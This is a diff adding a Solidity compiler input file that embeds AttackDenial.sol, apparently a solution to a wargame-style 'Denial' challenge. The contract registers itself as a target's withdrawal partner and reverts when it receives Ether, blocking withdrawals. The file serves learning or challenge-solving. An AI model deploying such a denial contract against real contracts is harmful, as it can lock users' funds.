@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Denial/AttackDenial.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IDenial {\n    function setWithdrawPartner(address _partner) external;\n    function withdraw() external;\n}\n\ncontract AttackDenial {\n    IDenial public target;\n\n    constructor(IDenial _target) payable {\n        target = _target;\n    }\n\n    // Main function to execute the attack\n    function setWithdrawPartner() external {\n        // Set this contract as the withdrawal partner on the target contract\n        target.setWithdrawPartner(address(this));\n    }\n\n    // Function to receive Ether: we immediately revert to deny the operation\n    receive() external payable {\n        if(address(target).balance > 0 && gasleft() <= 1000000){\n            revert(\"System compromised!\");\n        }\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
